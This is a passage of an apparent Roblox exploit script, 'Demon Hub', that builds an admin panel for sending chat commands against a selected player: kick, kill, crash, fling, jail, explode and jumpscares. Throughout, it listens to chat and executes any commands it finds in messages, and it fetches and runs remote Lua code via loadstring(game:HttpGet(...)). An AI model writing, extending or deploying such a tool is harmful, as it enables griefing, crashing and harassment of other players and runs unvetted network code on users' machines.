            channel.MessageReceived:Connect(function(message)
                if message.TextSource and message.Text then
                    ExecutarComando(message.Text:lower(), message.TextSource.Name)
                end
            end)
        end
    end
end

ConectarChat()
TextChatService.TextChannels.ChildAdded:Connect(function(channel)
    if channel:IsA("TextChannel") then
        channel.MessageReceived:Connect(function(message)
            if message.TextSource and message.Text then
                ExecutarComando(message.Text:lower(), message.TextSource.Name)
            end
        end)
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.5)
    ConectarChat()
end)

-- Criar Interface
local function CriarInterface()
    -- Carrega a WindUI
    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    
    -- Cria a janela
    local Window = WindUI:CreateWindow({
        Title = "Demon Hub | Admin Panel",
        Icon = "shield",
        Author = "by Hiro",
        Folder = "Demon Hub",
        Size = UDim2.fromOffset(650, 600),
        Transparent = true,
        Theme = "Midnight",
        Resizable = false,
        SideBarWidth = 200,
        BackgroundImageTransparency = 0.42,
        HideSearchBar = true,
        ScrollBarEnabled = true,
    })

    -- Aba Comandos
    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })
    local SectionComandos = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })

    local TargetName
    local function getPlayersList()
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            table.insert(t, p.Name)
        end
        return t
    end

    local Dropdown = SectionComandos:Dropdown({
        Title = "Selecionar Jogador",
        Values = getPlayersList(),
        Value = "",
        Callback = function(option)
            TargetName = option
        end
    })

    Players.PlayerAdded:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)
    Players.PlayerRemoving:Connect(function()
        Dropdown:SetValues(getPlayersList())
    end)

    -- Lista de comandos básicos (PREFIXO !)
    local comandosAlvo = {"kick","kill","killplus","fling","freeze","unfreeze","bring","jail","unjail","cubo","uncubo","backrooms","unbackrooms"}

    for _, cmd in ipairs(comandosAlvo) do
        SectionComandos:Button({
            Title = cmd:upper(),
            Desc = "Envia !"..cmd.." no chat para o jogador selecionado",
            Callback = function()
                if TargetName then
                    EnviarComando("!"..cmd, TargetName)
                else
                    WindUI:Notify("Erro", "Selecione jogadores primeiro!")
                end
            end
        })
    end

    -- Adicionar botão Crash específico
    SectionComandos:Button({
        Title = "CRASH",
        Icon = "alert-triangle",
        Desc = "Trava e kicka o jogador selecionado",
        Callback = function()
            if TargetName then
                EnviarComando("!crash", TargetName)
                WindUI:Notify("Crash", "Comando executado!")
            else
                WindUI:Notify("Erro", "Selecione um jogador primeiro!")
            end
        end
    })

    -- Adicionar botão Float específico
    SectionComandos:Button({
        Title = "FLOAT",
        Icon = "arrow-up",
        Desc = "Faz o jogador flutuar até morrer",
        Callback = function()
            if TargetName then
                EnviarComando("!float", TargetName)
                WindUI:Notify("Float", "Comando executado!")
            else
                WindUI:Notify("Erro", "Selecione um jogador primeiro!")
            end
        end
    })

    -- Adicionar botão Explodir específico
    SectionComandos:Button({
        Title = "EXPLODIR",
        Icon = "bomb",
        Desc = "Explode o jogador",
        Callback = function()
            if TargetName then
                EnviarComando("!explodir", TargetName)
                WindUI:Notify("EXPLOSÃO", "Comando executado!")
            else
                WindUI:Notify("Erro", "Selecione jogadores primeiro!")
            end
        end
    })

    -- Aba Misc (Jumpscares e Coolkid Avatar)
    local TabMisc = Window:Tab({ Title = "Misc", Icon = "ghost", Locked = false })
    
    -- Seção Jumpscares
    local SectionJumpscares = TabMisc:Section({ Title = "Jumpscares", Icon = "alert-triangle", Opened = true })
    
    -- Adicionar botões de jumpscare
    for i = 1, 4 do
        SectionJumpscares:Button({
            Title = "Jumpscare " .. i,
            Icon = "alert-triangle",
            Callback = function()
                if TargetName then
                    EnviarComando("!jumps" .. i, TargetName)
                    WindUI:Notify("Jumpscare", "Jumpscare " .. i .. " enviado!")
                else
                    WindUI:Notify("Erro", "Selecione um jogador primeiro!")
                end
            end
        })
    end

    -- Seção Avatar (APENAS COOLKID AVATAR)
    local SectionAvatar = TabMisc:Section({ Title = "Avatar", Icon = "shirt", Opened = true })
    
    -- Botão Coolkid Avatar
    SectionAvatar:Button({
        Title = "COOLKID AVATAR",
        Icon = "shirt",
        Callback = function()
            if TargetName then
                EnviarComando("!coolkidavatar", TargetName)
                
                -- Executar localmente se for o próprio jogador
                if TargetName == LocalPlayer.Name then
                    ApplyCoolkidAvatar()
                    WindUI:Notify("Coolkid Avatar", "Aplicado em você!")
                end
                
                WindUI:Notify("Coolkid Avatar", "Comando enviado para " .. TargetName .. "!")
            else
                WindUI:Notify("Erro", "Selecione um jogador primeiro!")
            end
        end
    })

    -- Aba Verify
    local TabVerify = Window:Tab({ Title = "Verify", Icon = "check", Locked = false })
    local SectionVerify = TabVerify:Section({ Title = "Verificar", Icon = "search", Opened = true })
    SectionVerify:Button({
        Title = "Enviar Verificação",
        Desc = "Envia !verifique no chat",
        Callback = function()
            EnviarComando("!verifique")
        end
    })

    -- Aba Whitelist Info
    local TabWhitelist = Window:Tab({ Title = "Whitelist", Icon = "shield", Locked = false })
    local SectionWhitelist = TabWhitelist:Section({ Title = "Informações", Icon = "info", Opened = true })
    
    -- Mostrar status da whitelist
    local userType, statusMessage = getUserWhitelistType(LocalPlayer.Name:lower())
    SectionWhitelist:Label({
        Title = "Seu Status",
        Desc = "Tipo: " .. (userType or "N/A") .. "\nStatus: " .. statusMessage
    })
    
    SectionWhitelist:Button({
        Title = "Atualizar Status",
        Icon = "refresh",
        Callback = function()
            local newType, newStatus = getUserWhitelistType(LocalPlayer.Name:lower())
            WindUI:Notify("Whitelist", "Status atualizado!\nTipo: " .. (newType or "N/A") .. "\nStatus: " .. newStatus)
        end
    })

    return Window
end

-- Criar interface após verificar whitelist
task.wait(2)
local success, errorMsg = pcall(CriarInterface)
if not success then
    warn("[Demon Hub] Erro ao criar interface:", errorMsg)
else
    print("[Demon Hub] Interface criada com sucesso!")
end

-- Notificação inicial
StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "[Demon Hub] Sistema carregado com sucesso!",
    Color = Color3.fromRGB(0, 255, 0),
    Font = Enum.Font.GothamBold
})
